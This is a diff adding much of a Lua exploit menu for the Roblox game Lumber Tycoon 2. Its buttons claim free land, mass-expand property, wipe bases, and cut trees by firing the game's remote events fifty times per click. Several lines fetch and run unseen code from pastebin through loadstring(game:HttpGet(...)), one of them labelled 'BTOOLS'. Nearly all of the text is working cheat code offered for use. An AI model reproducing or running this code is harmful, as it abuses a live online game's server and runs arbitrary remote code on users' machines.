+clone.Parent = game.Players.LocalPlayer.PlayerBlueprints.Blueprints
+end
+end)
+
+FreeLand.Name = "FreeLand"
+FreeLand.Parent = PlayerFrame
+FreeLand.BackgroundColor3 = Color3.new(0, 0, 0)
+FreeLand.BackgroundTransparency = 0.69999998807907
+FreeLand.BorderColor3 = Color3.new(1, 0, 0)
+FreeLand.Position = UDim2.new(0, 200, 0, 196)
+FreeLand.Size = UDim2.new(0, 160, 0, 20)
+FreeLand.Font = Enum.Font.Fantasy
+FreeLand.Text = "Free Land"
+FreeLand.TextColor3 = Color3.new(1, 1, 1)
+FreeLand.TextSize = 14
+FreeLand.MouseButton1Down:connect(function()
+for a,b in pairs(workspace.Properties:GetChildren()) do 
+    if b:FindFirstChild("Owner") and b:FindFirstChild("OriginSquare") and b.Owner.Value == nil then 
+        game.ReplicatedStorage.PropertyPurchasing.ClientPurchasedProperty:FireServer(b, b.OriginSquare.OriginCFrame.Value.p + Vector3.new(0,3,0))
+ wait(0.5)
+        Instance.new('RemoteEvent', game:service'ReplicatedStorage'.Interaction).Name = "Ban"
+	for i,v in pairs(game.Workspace.Properties:GetChildren()) do
+		if v.Owner.Value == game.Players.LocalPlayer then
+    game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    wait(0.1)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.OriginSquare.CFrame + Vector3.new(0,10,0)
+    game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    wait(0.1)
+		end
+	end
+
+  --     game.Players.LocalPlayer.Character:MoveTo(b.OriginSquare.Position)
+        break
+    end
+end
+end)
+
+
+MaxLand.Name = "MaxLand"
+MaxLand.Parent = PlayerFrame
+MaxLand.BackgroundColor3 = Color3.new(0, 0, 0)
+MaxLand.BackgroundTransparency = 0.69999998807907
+MaxLand.BorderColor3 = Color3.new(1, 0, 0)
+MaxLand.Position = UDim2.new(0, 200, 0, 219)
+MaxLand.Size = UDim2.new(0, 160, 0, 20)
+MaxLand.Font = Enum.Font.Fantasy
+MaxLand.Text = "MaxLand"
+MaxLand.TextColor3 = Color3.new(1, 1, 1)
+MaxLand.TextSize = 14
+MaxLand.MouseButton1Down:connect(function()
+  makesound("rbxassetid://156785206")
+for i, v in pairs(game:GetService("Workspace").Properties:GetChildren()) do
+		if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer then
+			base = v
+			square = v.OriginSquare
+			end
+		end
+	function makebase(pos)
+		local Event = game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty
+		Event:FireServer(base, pos)
+		end
+	spos = square.Position
+	makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z))
+	makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z))
+	makebase(CFrame.new(spos.X, spos.Y, spos.Z + 40))
+	makebase(CFrame.new(spos.X, spos.Y, spos.Z - 40))
+	makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z + 40))
+	makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z - 40))
+	makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z + 40))
+	makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z - 40))
+	makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z))
+	makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z))
+	makebase(CFrame.new(spos.X, spos.Y, spos.Z + 80))
+	makebase(CFrame.new(spos.X, spos.Y, spos.Z - 80))
+--Corners--
+	makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z + 80))
+	makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z - 80))
+	makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z + 80))
+	makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z - 80))
+--Corners--
+	makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z + 80))
+	makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z + 80))
+	makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z + 40))
+	makebase(CFrame.new(spos.X + 80, spos.Y, spos.Z - 40))
+	makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z + 40))
+	makebase(CFrame.new(spos.X - 80, spos.Y, spos.Z - 40))
+	makebase(CFrame.new(spos.X + 40, spos.Y, spos.Z - 80))
+	makebase(CFrame.new(spos.X - 40, spos.Y, spos.Z - 80))
+
+end)
+
+InfoText30.Name = "InfoText2"
+InfoText30.Parent = PlayerFrame
+InfoText30.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+InfoText30.BorderColor3 = Color3.new(0, 0, 0)
+InfoText30.BackgroundTransparency = 0
+InfoText30.Position = UDim2.new(0, 23, 0, 290)
+InfoText30.Size = UDim2.new(0, 150, 0, 150)
+InfoText30.TextColor3 = Color3.fromRGB(245, 205, 48)
+InfoText30.Font = Enum.Font.Fantasy
+InfoText30.Text =  "Wipe Base\n\nThis will delete everything on your base you have been warrned."
+InfoText30.TextSize = 14
+InfoText30.TextWrapped = true
+InfoText30.Visible = false
+
+WipeBase.MouseEnter:connect(function()
+InfoText30.Visible = true
+end)
+
+WipeBase.MouseLeave:connect(function()
+InfoText30.Visible = false
+end)
+
+WipeBase.Name = "WipeBase"
+WipeBase.Parent = PlayerFrame
+WipeBase.BackgroundColor3 = Color3.new(0, 0, 0)
+WipeBase.BackgroundTransparency = 0.69999998807907
+WipeBase.BorderColor3 = Color3.new(1, 0, 0)
+WipeBase.Position = UDim2.new(0, 200, 0, 242)
+WipeBase.Size = UDim2.new(0, 160, 0, 20)
+WipeBase.Font = Enum.Font.Fantasy
+WipeBase.Text = "Clear Entire Base"
+WipeBase.TextColor3 = Color3.new(1, 1, 1)
+WipeBase.TextSize = 14
+WipeBase.MouseButton1Down:Connect(function()
+  makesound("rbxassetid://156785206")
+for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
+if v:FindFirstChild("Owner") and v:FindFirstChild("Type") and v.Owner.Value == game.Players.LocalPlayer then
+local A_1 = v
+local Event = game:GetService("ReplicatedStorage").Interaction.DestroyStructure
+Event:FireServer(A_1)
+end
+end
+end)
+
+InfoText37.Name = "InfoText2"
+InfoText37.Parent = PlayerFrame
+InfoText37.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+InfoText37.BorderColor3 = Color3.new(0, 0, 0)
+InfoText37.BackgroundTransparency = 0
+InfoText37.Position = UDim2.new(0, 23, 0, 290)
+InfoText37.Size = UDim2.new(0, 150, 0, 150)
+InfoText37.TextColor3 = Color3.fromRGB(245, 205, 48)
+InfoText37.Font = Enum.Font.Fantasy
+InfoText37.Text =  "Wipe Base\n\nThis will delete all unfilled  Blueprints on your base you have been warrned."
+InfoText37.TextSize = 14
+InfoText37.TextWrapped = true
+InfoText37.Visible = false
+
+
+CBlueprint.MouseEnter:connect(function()
+InfoText37.Visible = true
+end)
+
+CBlueprint.MouseLeave:connect(function()
+InfoText37.Visible = false
+end)
+
+CBlueprint.Name = "CBlueprint"
+CBlueprint.Parent = PlayerFrame
+CBlueprint.BackgroundColor3 = Color3.new(0, 0, 0)
+CBlueprint.BackgroundTransparency = 0.69999998807907
+CBlueprint.BorderColor3 = Color3.new(1, 0, 0)
+CBlueprint.Position = UDim2.new(0, 200, 0, 265)
+CBlueprint.Size = UDim2.new(0, 160, 0, 20)
+CBlueprint.Font = Enum.Font.Fantasy
+CBlueprint.Text = "Clear Blueprints"
+CBlueprint.TextColor3 = Color3.new(1, 1, 1)
+CBlueprint.TextSize = 14
+CBlueprint.MouseButton1Down:Connect(function()
+  makesound("rbxassetid://156785206")
+for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
+if v:FindFirstChild("Owner") and v:FindFirstChild("Type") and v.Owner.Value == game.Players.LocalPlayer then
+	if v.Type.Value == "Blueprint" then
+local A_1 = v
+local Event = game:GetService("ReplicatedStorage").Interaction.DestroyStructure
+Event:FireServer(A_1)
+end
+end
+end
+end)
+
+InfoText38.Name = "InfoText2"
+InfoText38.Parent = PlayerFrame
+InfoText38.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+InfoText38.BorderColor3 = Color3.new(0, 0, 0)
+InfoText38.BackgroundTransparency = 0
+InfoText38.Position = UDim2.new(0, 23, 0, 290)
+InfoText38.Size = UDim2.new(0, 150, 0, 150)
+InfoText38.TextColor3 = Color3.fromRGB(245, 205, 48)
+InfoText38.Font = Enum.Font.Fantasy
+InfoText38.Text =  "Wipe Base\n\nThis will delete all Structure on your base you have been warrned."
+InfoText38.TextSize = 14
+InfoText38.TextWrapped = true
+InfoText38.Visible = false
+
+
+CStructure.MouseEnter:connect(function()
+InfoText38.Visible = true
+end)
+
+CStructure.MouseLeave:connect(function()
+InfoText38.Visible = false
+end)
+
+CStructure.Name = "CStructure"
+CStructure.Parent = PlayerFrame
+CStructure.BackgroundColor3 = Color3.new(0, 0, 0)
+CStructure.BackgroundTransparency = 0.69999998807907
+CStructure.BorderColor3 = Color3.new(1, 0, 0)
+CStructure.Position = UDim2.new(0, 200, 0, 288)
+CStructure.Size = UDim2.new(0, 160, 0, 20)
+CStructure.Font = Enum.Font.Fantasy
+CStructure.Text = "Clear Structures"
+CStructure.TextColor3 = Color3.new(1, 1, 1)
+CStructure.TextSize = 14
+CStructure.MouseButton1Down:Connect(function()
+  makesound("rbxassetid://156785206")
+for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
+if v:FindFirstChild("Owner") and v:FindFirstChild("Type") and v.Owner.Value == game.Players.LocalPlayer then
+	if v.Type.Value == "Structure" or v.Type.Value == "Furniture" then
+local A_1 = v
+local Event = game:GetService("ReplicatedStorage").Interaction.DestroyStructure
+Event:FireServer(A_1)
+end
+end
+end
+end)
+
+BToolALL.Name = "BToolALL"
+BToolALL.Parent = PlayerFrame
+BToolALL.BackgroundColor3 = Color3.new(0, 0, 0)
+BToolALL.BackgroundTransparency = 0.69999998807907
+BToolALL.BorderColor3 = Color3.new(1, 0, 0)
+BToolALL.Position = UDim2.new(0, 200, 0, 311)
+BToolALL.Size = UDim2.new(0, 160, 0, 20)
+BToolALL.Font = Enum.Font.Fantasy
+BToolALL.Text = "(CyclicaIIy) BTOOLS"
+BToolALL.TextColor3 = Color3.new(1, 1, 1)
+BToolALL.TextSize = 14
+BToolALL.MouseButton1Down:Connect(function()
+  makesound("rbxassetid://156785206")
+loadstring(game:HttpGet(('https://pastebin.com/raw/a2nVDRVZ'),true))()
+
+end)
+
+
+TeleportA.Name = "Teleport"
+TeleportA.Parent = Picker
+TeleportA.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
+TeleportA.BorderColor3 = Color3.new(0, 0, 0)
+TeleportA.Position = UDim2.new(0, 15, 0,90)
+TeleportA.Size = UDim2.new(0, 80, 0, 80)
+TeleportA.ZIndex = 3
+TeleportA.Image = "rbxassetid://4892951560"
+TeleportA.ScaleType = Enum.ScaleType.Crop
+TeleportA.MouseButton1Click:Connect(function()
+CurrentItem.Image = "rbxassetid://4892951560"
+  makesound("rbxassetid://156785206")
+AIntroImage.Visible = false
+AIntroImage1.Visible = false
+TimesFrame.Visible = true
+end)
+
+Waypoints.Name = "Waypoints"
+Waypoints.Parent = MenuFrame
+Waypoints.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Waypoints.BackgroundTransparency = 0.5
+Waypoints.BorderColor3 = Color3.new(0, 0, 0)
+Waypoints.Size = UDim2.new(0, 170, 0, 465)
+Waypoints.CanvasPosition = Vector2.new(0,0)
+Waypoints.CanvasSize = UDim2.new(0, 0, 0, 650)
+Waypoints.Visible = false
+
+WaypointsA.Name = "WaypointsA"
+WaypointsA.Parent = Waypoints
+WaypointsA.BackgroundColor3 = Color3.new(255, 0, 0)
+WaypointsA.BackgroundTransparency = 0
+WaypointsA.BorderColor3 = Color3.fromRGB(151, 0, 0)
+WaypointsA.Position = UDim2.new(0, 5, 0, 3)
+WaypointsA.Size = UDim2.new(0, 148, 0, 20)
+WaypointsA.Font = Enum.Font.Fantasy
+WaypointsA.Text = "--Waypoints--"
+WaypointsA.TextColor3 = Color3.new(1, 1, 1)
+WaypointsA.TextSize = 14
+
+loadstring(game:HttpGet('https://pastebin.com/raw/35eUQqLh',true))()
+
+
+
+ShopsTitle.Name = "ShopsTitle"
+ShopsTitle.Parent = Waypoints
+ShopsTitle.BackgroundColor3 = Color3.new(255, 0, 0)
+ShopsTitle.BackgroundTransparency = 0
+ShopsTitle.BorderColor3 = Color3.fromRGB(151, 0, 0)
+ShopsTitle.Position = UDim2.new(0, 5, 0, 233)
+ShopsTitle.Size = UDim2.new(0, 148, 0, 20)
+ShopsTitle.Font = Enum.Font.Fantasy
+ShopsTitle.Text = "---- Shops ----"
+ShopsTitle.TextColor3 = Color3.new(1, 1, 1)
+ShopsTitle.TextSize = 14
+
+loadstring(game:HttpGet('https://pastebin.com/raw/NX3GZp3W',true))()
+
+Woodmenu.Name = "Woodmenu"
+Woodmenu.Parent = Picker
+Woodmenu.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
+Woodmenu.BorderColor3 = Color3.new(0, 0, 0)
+Woodmenu.Position = UDim2.new(0, 15, 0,175)
+Woodmenu.Size = UDim2.new(0, 80, 0, 80)
+Woodmenu.ZIndex = 3
+Woodmenu.Image = "rbxassetid://4892951833"
+Woodmenu.ScaleType = Enum.ScaleType.Crop
+Woodmenu.MouseButton1Click:Connect(function()
+CurrentItem.Image = "rbxassetid://4892951833"
+  makesound("rbxassetid://156785206")
+AIntroImage.Visible = false
+AIntroImage1.Visible = false
+AIntroImage2.Visible = false
+AIntroImage3.Visible = false
+TimesFrame.Visible = false
+
+end)
+
+WoodFrame.Name = "WoodFrame"
+WoodFrame.Parent = MenuFrame
+WoodFrame.BorderSizePixel = 1
+WoodFrame.BackgroundTransparency = 0.5
+WoodFrame.BorderColor3 = Color3.new(0, 0, 0)
+WoodFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+WoodFrame.Size = UDim2.new(0, 380, 0, 460)
+WoodFrame.Visible = false
+
+InfoText21.Name = "InfoText2"
+InfoText21.Parent = MainFrame
+InfoText21.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+InfoText21.BorderColor3 = Color3.new(0, 0, 0)
+InfoText21.BackgroundTransparency = 0
+InfoText21.Position = UDim2.new(0, 28, 0, 330)
+InfoText21.Size = UDim2.new(0, 150, 0, 150)
+InfoText21.TextColor3 = Color3.fromRGB(245, 205, 48)
+InfoText21.Font = Enum.Font.Fantasy
+InfoText21.Text =  "Wood to Saw\n\n1.Cut Trees, it will not do Fully Grown Trees.\n2.PRESS (q), Then With your mouse Click your Sawmill.\n3.PRESS (e) on keyboard, With your mouse Click a piece of wood."
+InfoText21.TextSize = 14
+InfoText21.TextWrapped = true
+InfoText21.Visible = false
+
+Hel.MouseEnter:connect(function()
+InfoText21.Visible = true
+end)
+
+Hel.MouseLeave:connect(function()
+InfoText21.Visible = false
+end)
+
+Hel.Name = "Hel"
+Hel.Parent = WoodFrame
+Hel.BackgroundColor3 = Color3.new(0, 0, 0)
+Hel.BackgroundTransparency = 0
+Hel.BorderColor3 = Color3.new(1, 0, 0)
+Hel.BorderSizePixel = 0
+Hel.Position = UDim2.new(0, 158, 0, 5)
+Hel.Size = UDim2.new(0, 30, 0, 20)
+Hel.Font = Enum.Font.Fantasy
+Hel.Text = "Help"
+Hel.TextColor3 = Color3.fromRGB(245, 205, 48)
+Hel.TextSize = 14
+
+WoodTitle.Name = "WoodTitle"
+WoodTitle.Parent = WoodFrame
+WoodTitle.BackgroundColor3 = Color3.new(255, 0, 0)
+WoodTitle.BackgroundTransparency = 0
+WoodTitle.BorderSizePixel = 0
+WoodTitle.Position = UDim2.new(0, 5, 0, 5)
+WoodTitle.Size = UDim2.new(0, 150, 0, 20)
+WoodTitle.Font = Enum.Font.Fantasy
+WoodTitle.Text = "Wood Teleporting"
+WoodTitle.TextColor3 = Color3.new(1, 1, 1)
+WoodTitle.TextSize = 14
+
+ToSawmillTitle.Name = "ToSawmillTitle"
+ToSawmillTitle.Parent = WoodFrame
+ToSawmillTitle.BackgroundColor3 = Color3.new(0, 0, 0)
+ToSawmillTitle.BackgroundTransparency = 1
+ToSawmillTitle.BorderColor3 = Color3.new(1, 0, 0)
+ToSawmillTitle.Position = UDim2.new(0, 5, 0, 25)
+ToSawmillTitle.Size = UDim2.new(0, 150, 0, 20)
+ToSawmillTitle.Font = Enum.Font.Fantasy
+ToSawmillTitle.Text = "-- Teleport To Sawmill --"
+ToSawmillTitle.TextColor3 = Color3.new(0, 1, 0)
+ToSawmillTitle.TextSize = 14
+
+SawmillTitle.Name = "SawmillTitle"
+SawmillTitle.Parent = WoodFrame
+SawmillTitle.BackgroundColor3 = Color3.new(0, 0, 0)
+SawmillTitle.BorderColor3 = Color3.new(1, 0, 0)
+SawmillTitle.BackgroundTransparency = 0.69999998807907
+SawmillTitle.Position = UDim2.new(0, 5, 0, 48)
+SawmillTitle.Size = UDim2.new(0, 65, 0, 20)
+SawmillTitle.Font = Enum.Font.Fantasy
+SawmillTitle.Text = "Sawmill:"
+SawmillTitle.TextColor3 = Color3.new(1, 1, 1)
+SawmillTitle.TextSize = 14
+
+SawmillSetTitle.Name = "SawmillSetTitle"
+SawmillSetTitle.Parent = WoodFrame
+SawmillSetTitle.BackgroundColor3 = Color3.new(0, 0, 0)
+SawmillSetTitle.BackgroundTransparency = 0.69999998807907
+SawmillSetTitle.BorderColor3 = Color3.new(1, 0, 0)
+SawmillSetTitle.Position = UDim2.new(0, 75, 0, 48)
+SawmillSetTitle.Size = UDim2.new(0, 80, 0, 20)
+SawmillSetTitle.Font = Enum.Font.Fantasy
+SawmillSetTitle.Text = "Not Selected"
+SawmillSetTitle.TextColor3 = Color3.new(0, 1, 0)
+SawmillSetTitle.TextSize = 14
+
+KeybindingsTitle.Name = "KeybindingsTitle"
+KeybindingsTitle.Parent = WoodFrame
+KeybindingsTitle.BackgroundColor3 = Color3.new(1, 0, 0)
+KeybindingsTitle.BackgroundTransparency = 1
+KeybindingsTitle.BorderColor3 = Color3.new(1, 0, 0)
+KeybindingsTitle.Position = UDim2.new(0, 5, 0, 71)
+KeybindingsTitle.Size = UDim2.new(0, 150, 0, 20)
+KeybindingsTitle.Font = Enum.Font.Fantasy
+KeybindingsTitle.Text = "-- Key Bindings --"
+KeybindingsTitle.TextColor3 = Color3.new(0, 1, 0)
+KeybindingsTitle.TextSize = 14
+
+SetSawmillKey.Name = "SetSawmillKey"
+SetSawmillKey.Parent = WoodFrame
+SetSawmillKey.BackgroundColor3 = Color3.new(0, 0, 0)
+SetSawmillKey.BorderColor3 = Color3.new(1, 0, 0)
+SetSawmillKey.BackgroundTransparency = 0.69999998807907
+SetSawmillKey.Position = UDim2.new(0, 5, 0, 93)
+SetSawmillKey.Size = UDim2.new(0, 125, 0, 20)
+SetSawmillKey.Font = Enum.Font.Fantasy
+SetSawmillKey.Text = "Sawmill Select Key"
+SetSawmillKey.TextColor3 = Color3.new(1, 1, 1)
+SetSawmillKey.TextSize = 14
+
+SetSawTPKey.Name = "SetSawTPKey"
+SetSawTPKey.Parent = WoodFrame
+SetSawTPKey.BackgroundColor3 = Color3.new(0, 0, 0)
+SetSawTPKey.BorderColor3 = Color3.new(1, 0, 0)
+SetSawTPKey.BackgroundTransparency = 0.69999998807907
+SetSawTPKey.Position = UDim2.new(0, 5, 0, 116)
+SetSawTPKey.Size = UDim2.new(0, 125, 0, 20)
+SetSawTPKey.Font = Enum.Font.Fantasy
+SetSawTPKey.Text = "Wood To Mill Key"
+SetSawTPKey.TextColor3 = Color3.new(1, 1, 1)
+SetSawTPKey.TextSize = 14
+
+SetSellTPKey.Name = "SetSellTPKey"
+SetSellTPKey.Parent = WoodFrame
+SetSellTPKey.BackgroundColor3 = Color3.new(0, 0, 0)
+SetSellTPKey.BorderColor3 = Color3.new(1, 0, 0)
+SetSellTPKey.BackgroundTransparency = 0.69999998807907
+SetSellTPKey.Position = UDim2.new(0, 5, 0, 139)
+SetSellTPKey.Size = UDim2.new(0, 125, 0, 20)
+SetSellTPKey.Font = Enum.Font.Fantasy
+SetSellTPKey.Text = "Sell Wood Key"
+SetSellTPKey.TextColor3 = Color3.new(1, 1, 1)
+SetSellTPKey.TextSize = 14
+
+SetSawBox.Name = "SetSawBox"
+SetSawBox.Parent = WoodFrame
+SetSawBox.BackgroundColor3 = Color3.new(0, 0, 0)
+SetSawBox.BorderColor3 = Color3.new(1, 0, 0)
+SetSawBox.BackgroundTransparency = 0.69999998807907
+SetSawBox.Position = UDim2.new(0, 135, 0, 93)
+SetSawBox.Size = UDim2.new(0, 30, 0, 20)
+SetSawBox.Font = Enum.Font.Fantasy
+SetSawBox.Text = "q"
+SetSawBox.TextColor3 = Color3.new(1, 1, 1)
+SetSawBox.TextSize = 14
+
+SawTPBox.Name = "SawTPBox"
+SawTPBox.Parent = WoodFrame
+SawTPBox.BackgroundColor3 = Color3.new(0, 0, 0)
+SawTPBox.BackgroundTransparency = 0.69999998807907
+SawTPBox.BorderColor3 = Color3.new(1, 0, 0)
+SawTPBox.Position = UDim2.new(0, 135, 0, 116)
+SawTPBox.Size = UDim2.new(0, 30, 0, 20)
+SawTPBox.Font = Enum.Font.Fantasy
+SawTPBox.Text = "e"
+SawTPBox.TextColor3 = Color3.new(1, 1, 1)
+SawTPBox.TextSize = 14
+
+SellWoodBox.Name = "SellWoodBox"
+SellWoodBox.Parent = WoodFrame
+SellWoodBox.BackgroundColor3 = Color3.new(0, 0, 0)
+SellWoodBox.BackgroundTransparency = 0.69999998807907
+SellWoodBox.BorderColor3 = Color3.new(1, 0, 0)
+SellWoodBox.Position = UDim2.new(0, 135, 0, 139)
+SellWoodBox.Size = UDim2.new(0, 30, 0, 20)
+SellWoodBox.Font = Enum.Font.Fantasy
+SellWoodBox.Text = "r"
+SellWoodBox.TextColor3 = Color3.new(1, 1, 1)
+SellWoodBox.TextSize = 14
+
+InfoText25.Name = "InfoText2"
+InfoText25.Parent = MainFrame
+InfoText25.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+InfoText25.BorderColor3 = Color3.new(0, 0, 0)
+InfoText25.BackgroundTransparency = 0
+InfoText25.Position = UDim2.new(0, 28, 0, 330)
+InfoText25.Size = UDim2.new(0, 150, 0, 150)
+InfoText25.TextColor3 = Color3.fromRGB(245, 205, 48)
+InfoText25.Font = Enum.Font.Fantasy
+InfoText25.Text =  "Bring Trees\n\n1.Type In QTY how many trees you want.\n2.Make sure your holding a good AXE.\n CLICK on a tree"
+InfoText25.TextSize = 14
+InfoText25.TextWrapped = true
+InfoText25.Visible = false
+
+TreeHeader.MouseEnter:connect(function()
+InfoText25.Visible = true
+end)
+
+TreeHeader.MouseLeave:connect(function()
+InfoText25.Visible = false
+end)
+
+
+TreeHeader.Name = "TreeHeader"
+TreeHeader.Parent = WoodFrame
+TreeHeader.BackgroundColor3 = Color3.new(255, 0, 0)
+TreeHeader.BackgroundTransparency = 0
+TreeHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
+TreeHeader.Position = UDim2.new(0, 215, 0, 5)
+TreeHeader.Size = UDim2.new(0, 100, 0, 20)
+TreeHeader.Font = Enum.Font.Fantasy
+TreeHeader.Text = "Bring Trees"
+TreeHeader.TextColor3 = Color3.new(1, 1, 1)
+TreeHeader.TextSize = 14
+
+loadstring(game:HttpGet('https://pastebin.com/raw/Ks8mCzWm',true))()
+
+WoodTools.Name = "WoodTools"
+WoodTools.Parent = WoodFrame
+WoodTools.BackgroundColor3 = Color3.new(255, 0, 0)
+WoodTools.BackgroundTransparency = 0
+WoodTools.Position = UDim2.new(0, 5, 0, 167)
+WoodTools.Size = UDim2.new(0, 165, 0, 20)
+WoodTools.Font = Enum.Font.Fantasy
+WoodTools.Text = "Wood Tools"
+WoodTools.TextColor3 = Color3.new(1, 1, 1)
+WoodTools.TextSize = 14
+
+InfoText22.Name = "InfoText2"
+InfoText22.Parent = MainFrame
+InfoText22.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+InfoText22.BorderColor3 = Color3.new(0, 0, 0)
+InfoText22.BackgroundTransparency = 0
+InfoText22.Position = UDim2.new(0, 28, 0, 330)
+InfoText22.Size = UDim2.new(0, 150, 0, 150)
+InfoText22.TextColor3 = Color3.fromRGB(245, 205, 48)
+InfoText22.Font = Enum.Font.Fantasy
+InfoText22.Text =  "Johiro Goldaxe\n\n1.Select any axe.\n2.Point at a tree you need CLICK LEFT mouse button.\nTo Use on ENDTIMES tree, you must Use a ENDTIMES AXE."
+InfoText22.TextSize = 14
+InfoText22.TextWrapped = true
+InfoText22.Visible = false
+
+
+Goldaxe.MouseEnter:connect(function()
+InfoText22.Visible = true
+end)
+
+Goldaxe.MouseLeave:connect(function()
+InfoText22.Visible = false
+end)
+
+Goldaxe.Name = "SawmillTp"
+Goldaxe.Parent = WoodFrame
+Goldaxe.BackgroundColor3 = Color3.new(0, 0, 0)
+Goldaxe.BackgroundTransparency = 0.59999998807907
+Goldaxe.BorderColor3 = Color3.new(1, 0, 0)
+Goldaxe.Position = UDim2.new(0, 3, 0, 190)
+Goldaxe.Size = UDim2.new(0, 165, 0, 20)
+Goldaxe.Font = Enum.Font.Fantasy
+Goldaxe.Text = "Gold Axe Off"
+Goldaxe.TextColor3 = Color3.new(1, 1, 1)
+Goldaxe.TextSize = 14
+spawn(function()
+--Credits to Johiro, if you decide to skid atleast give credits
+GAxe = false
+function GetAxe() --Gets your current axe thats equiped when called
+    if game.Players.LocalPlayer.Character:FindFirstChild("Tool") then 
+        return game.Players.LocalPlayer.Character.Tool --returns the axe when found
+    else 
+        return false --returns false when not equiped
+    end
+end
+
+function GetDamage(Axe, TreeClass)-- Gets the right Damage of the axe and returns it if called to prevent killing yourself like gold axe
+    if Axe.ToolTip == "Basic Hatchet" then return 0.2
+    elseif Axe.ToolTip == "Plain Axe" then return 0.55
+    elseif Axe.ToolTip == "Steel Axe" then return 0.93
+    elseif Axe.ToolTip == "Hardened Axe" then return 1.45
+    elseif Axe.ToolTip == "Silver Axe" then return 1.6
+    elseif Axe.ToolTip == "Rukiryaxe" then return 1.68
+    elseif Axe.ToolTip == "Beta Axe of Bosses" then return 1.45
+    elseif Axe.ToolTip == "Alpha Axe of Testing" then return 1.5
+    elseif Axe.ToolTip == "Fire Axe" then
+        if TreeClass ~= "Volcano" then return 0.6 else return 6.35 end
+    elseif Axe.ToolTip == "End Times Axe" then
+        if TreeClass ~= "LoneCave" then return 1.58 else return 10000000 end
+    elseif Axe.ToolTip == "Candy Cane Axe" then return 0
+    elseif Axe.ToolTip == "Johiro" then return 1.8
+    elseif Axe.ToolTip == "Beesaxe" then return 1.4
+    elseif Axe.ToolTip == "CHICKEN AXE" then return 0.9
+    elseif Axe.ToolTip == "Amber Axe" then return 3.39
+    elseif Axe.ToolTip == "The Many Axe" then return 10.2
+    elseif Axe.ToolTip == "Gingerbread Axe" then
+        if TreeClass == "Walnut" then return 8.5
+    elseif TreeClass == "Koa" then return 11 else return 1.2 end
+    elseif Axe.ToolTip == "Bird Axe" then
+        if TreeClass == "Volcano" then return 2.5 elseif TreeClass == "CaveCrawler" then return 3.9 else return 1.65 end
+    end
+end
+
+
+function GCut(TreePart) --Cuts the tree when called with the tree you want to cut
+    if GetAxe() ~= false then --checks if you have a axe equiped
+		Damage = GetDamage(GetAxe(), TreePart.Parent.TreeClass.Value) --gets the Damage
+		Height = TreePart.CFrame:pointToObjectSpace(mouse.Hit.p).Y + TreePart.Size.Y/2 --Gets the Height
+        local CutArguments = {
+            sectionId = TreePart.ID.Value,
+            faceVector = Vector3.new(0,0,-1),
+            height = Height,
+            hitPoints = Damage,
+            cooldown = 0,
+            cuttingClass = "Axe",
+            tool = GetAxe()
+        }
+        for i=1, 50 do
+            game.ReplicatedStorage.Interaction.RemoteProxy:FireServer(TreePart.Parent.CutEvent, CutArguments)
+        end
+    end
+end
+
+function CutTree(Tree) --Cuts the tree when called with the tree you want to cut
+    if GetAxe() ~= false then --checks if you have a axe equiped
+		Damage = GetDamage(GetAxe(), Tree.TreeClass.Value) --gets the Damage
+        local CutArguments = {
+            sectionId = 1,
+            faceVector = Vector3.new(0,0,-1),
+            height = 0.5,
+            hitPoints = Damage,
+            cooldown = 0,
+            cuttingClass = "Axe",
+            tool = GetAxe()
+        }
+        for i=1, 50 do
+            game.ReplicatedStorage.Interaction.RemoteProxy:FireServer(Tree.CutEvent, CutArguments)
+        end
+    end
+end
+
+TreeList = {} --Creates a table of the trees
+for a,b in pairs(workspace:GetChildren()) do
+    if b.name == "TreeRegion" then 
+        b.ChildAdded:Connect(function(NewTree)--Creates functions that Adds new trees to the list
+            table.insert(TreeList, NewTree)
+        end)
+        for c,d in pairs(b:GetChildren()) do-- Adds the trees when first time starting the script 
+            if d.Name == "Model" then
+                table.insert(TreeList, d)
+            end
+        end
+    end
+end
+
+spawn(function() --used spawn so it wont interrupt any of the other things
+CutEnabled = false
+while wait(.5) do --Main loop to do the stuff
+    if CutEnabled == true then
+        if GetAxe() ~= false then --Checks if you have a axe equiped
+            for a,b in pairs(TreeList) do
+                if not b:FindFirstChild("RootCut") and b:FindFirstChild("CutEvent") then --Checks if the tree is already cut
+                    distance = (game.Players.LocalPlayer.Character.Head.Position - b.WoodSection.Position).magnitude --gets the distance between player and tree
+                    if distance < 225 then --if distance lower than 225 then it will cut the tree
+                        CutTree(b) --Calls the function with the tree to cut
+                    end
+                else 
+                    table.remove(TreeList, a)--if tree already cut then it gets removed from the list
+				end
+			end
+        end
+    end
+end
+end)
+
+mouse = game.Players.LocalPlayer:GetMouse() --Gets the Mouse
+mouse.Button1Down:connect(function()
+	if GAxe == true and GetAxe() ~= false then
+		Target = mouse.Target
+		GCut(Target)
+    end
+end)
